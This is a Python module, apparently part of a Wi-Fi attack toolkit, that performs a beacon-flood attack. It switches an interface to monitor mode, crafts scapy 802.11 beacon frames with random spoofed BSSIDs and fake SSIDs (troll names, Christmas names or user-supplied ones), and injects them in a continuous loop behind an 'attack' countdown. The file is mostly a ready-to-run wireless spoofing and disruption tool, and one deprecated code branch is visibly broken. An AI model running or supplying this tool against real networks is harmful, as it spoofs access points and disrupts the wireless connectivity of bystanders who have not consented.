# WIFI SCANNER  // BEACON FLOOD MODULE

from rich.panel import Panel
from rich.live import Live
from rich.console import Console
from scapy.all import sendp, RandMAC, RadioTap
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
import random
import time

from nsm_utilities import Background_Threads
from nsm_deauth import Frame_Snatcher

console = Console()


class Beacon_Flooder:
    """This class will be responsible for creating and flooding fake APs to nearby devices"""

    # CLASS VARS
    trolling_ssids = [
        "FBI_Surveillance_Van",
        "PrettyFlyForAWiFi",
        "ItHurtsWhenIP",
        "DropTablesWiFi;",
        "Virus_AP_DoNotConnect",
        "NSA_CoffeeShop",
        "404_WiFi_Not_Found",
        "Free_Vbucks_5GHz",
        "TellMyWiFiLoveHer",
        "Barii_Hacking_You",
        "LAN_of_the_Free",
        "WuTangLAN",
        "C:\Virus.exe",
        "Give_Us_Your_Data",
        "Pay4WiFi_Loser",
        "Open_AP_Honeypot",
        "DefinitelyNotAScam",
        "Connect_And_Cry",
        "Skynet_Online",
        "Free_Crypto_Mining",
    ]

    # f
    christmas_ssids = [
        "MerryChristmas",
        "Merry_Christmas",
        "MerryChristmas_WiFi",
        "MerryChristmas_Guest",
        "MerryChristmas24",
        "MerryChristmasNet",
        "MerryChristmasLAN",
        "MerryChristmasHome",
        "MerryChristmas_AP",
        "MerryChristmas_Free",
        "MerryXmas",
        "Merry_Xmas",
        "MerryXmas_WiFi",
        "MerryXmas_Guest",
        "MerryXmas24",
        "MerryXmasNet",
        "HappyHolidays",
        "Happy_Holidays",
        "HappyHolidays_WiFi",
        "HappyHolidays_Guest",
        "ChristmasWiFi",
        "Christmas_WiFi",
        "ChristmasGuest",
        "Christmas24",
    ]

    def __init__(self):
        pass

    @classmethod
    def _choose_ssid_type(cls):
        """This metod will allow the user to choose the type of ssid list to advertise"""

        console.print(
            "1. ssids_trollings", "\n2. ssids_christmas", "\n3. Enter Custom list"
        )

        while True:
            try:
                choice = console.input("\n\n[bold blue]Enter ssid type: ").strip()

                if choice == "1":
                    return cls.trolling_ssids
                elif choice == "2":
                    return cls.christmas_ssids
                elif choice == "3":
                    console.print(
                        "[bold green]Enter ssids seperated by a comma ','  Press enter when your done!"
                    )

                    raw = console.input("\n\n[bold yellow]Enter custom ssids: ").strip()
                    ssids = []
                    clean = raw.split(",")
                    for c in clean:
                        ssids.append(c) if c != "," else ""
                    return ssids

                else:
                    console.print("Choose a valid option goofy")

            except Exception as e:
                console.print(f"[bold red]Exception Error:[bold yellow] {e}")
                input()

    @classmethod
    def get_bssid(cls, type):
        """This method will create a bssid"""

        # 1 == RANDOM
        if type == 1:
            mac = str(RandMAC())
            parts = mac.split(":")
            # Force unicast (bit 0 = 0) and locally administered (bit 1 = 1)
            first_octet = (int(parts[0], 16) & 0xFE) | 0x02
            return "%02x:%s" % (first_octet, ":".join(parts[1:]))

        elif type == 2:
            return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
                random.randint(0, 255) for _ in range(5)
            )

        pass

    @classmethod
    def get_frames(cls, amount, ssid_type, bssid_type, client="ff:ff:ff:ff:ff:ff"):
        """This method will create the frame"""

        # VAR
        frames = []
        verbose = True
        print("\n\n")

        _b = Beacon_Flooder()

        # DEAPPRECIATED // TERRIBLE LOGIC LOL
        if ssid_type == 99:
            while amount >= 0:
                # GET SSID
                ssid = ssid_type

                # GET BSSID
                bssid = Beacon_Flooder.get_bssid(type=bssid_type)

                # CRAFT FRAME
                dot11 = Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid)
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))
                dsset = Dot11Elt(ID="DSset", info=b"\x06")
                rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
                frame = RadioTap() / dot11 / beacon / essid / dsset / rates

                # APPEND AND GO
                frames.append(frame)

                amount -= 1

                if verbose:
                    console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")

        else:
            seq = 0
            for ssid in ssid_type:
                bssid = Beacon_Flooder.get_bssid(type=bssid_type)

                # CRAFT FRAME
                frame = (
                    RadioTap()
                    / Dot11(
                        type=0,
                        subtype=8,
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=bssid,
                        addr3=bssid,
                        SC=(seq << 4),
                    )
                    / Dot11Beacon()
                    / Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                )

                # APPEND AND GO
                frames.append(frame)
                seq = (seq + 1) % 4096  # Sequence wraps at 4096

                if verbose:
                    console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")

            print("\n")
            return frames

        # NOW RETURN THE LIST OF FRAMES
        return frames

    @classmethod
    def frame_injector(cls, frames, count=1):
        """This method will inject the frames into the network"""

        # VARS
        sent = 0
        down = 5
        c1 = "bold red"

        # PANEL
        panel = Panel(
            renderable=f"Launching Attack in {down}",
            title="Attack Status",
            style="bold yellow",
            border_style="bold red",
            expand=False,
        )

        # LOOP
        with Live(panel, console=console, refresh_per_second=4):
            # COUNT DOWN
            while down != 0:
                # PANEL
                panel.renderable = f"Launching Attack in {down}"
                time.sleep(1)

                # DECREASE
                down -= 1

            # LOOP FOR ERRORS
            while True:
                try:
                    sendp(frames, verbose=0, iface=cls.iface)
                    sent += count * len(frames)

                    panel.renderable = (
                        f"[{c1}]Targets:[/{c1}] {len(frames)}  -  "
                        f"[{c1}]Frames Sent:[/{c1}] {sent}  -  "
                    )

                    time.sleep(0.1)

                # THIS LOGIC IS TO SUBSIDIZE SENDP
                except KeyboardInterrupt:
                    console.print("ATTEMPTING TO ESCAPE THE MATRIX", style="bold red")

                    try:
                        time.sleep(0.5)

                        break

                    except KeyboardInterrupt:
                        console.print("STOP PRESSING CTRL + C", style="bold yellow")

                # GENERAL ERRORS
                except Exception as e:
                    console.print(e)

                    # FOR CONSISTENT ERRORS
                    if down < 3:
                        down += 1

                    elif down == 4:
                        console.print("[bold red]MAX ERRORS OCCURED: 4")
                        time.sleep(2)
                        break

    @classmethod
    def main(cls):
        """This is where class wide logic will be performed from"""

        # CATCH
        try:
            # GET IFACE3
            cls.iface = Frame_Snatcher.get_interface()

            # OUTPUT UI
            Frame_Snatcher.welcome_ui(
                iface=cls.iface, text="    WiFi \nSpoofing", skip=True
            )
            Background_Threads.change_iface_mode(iface=cls.iface, mode="monitor")

            # SET CHANNEL
            Background_Threads.channel_hopper(set_channel=int(6))
            time.sleep(0.2)

            ssid_type = Beacon_Flooder._choose_ssid_type()

            # CRAFT FRAMES
            frames = Beacon_Flooder.get_frames(
                ssid_type=ssid_type, bssid_type=1, amount=15
            )

            # INJECT THE FRAMES
            Beacon_Flooder.frame_injector(frames=frames)

            console.print(frames)

        except KeyboardInterrupt as e:
            console.print(e)

        except Exception as e:
            console.print(f"[bold red]Exception Error:[yellow] {e}")
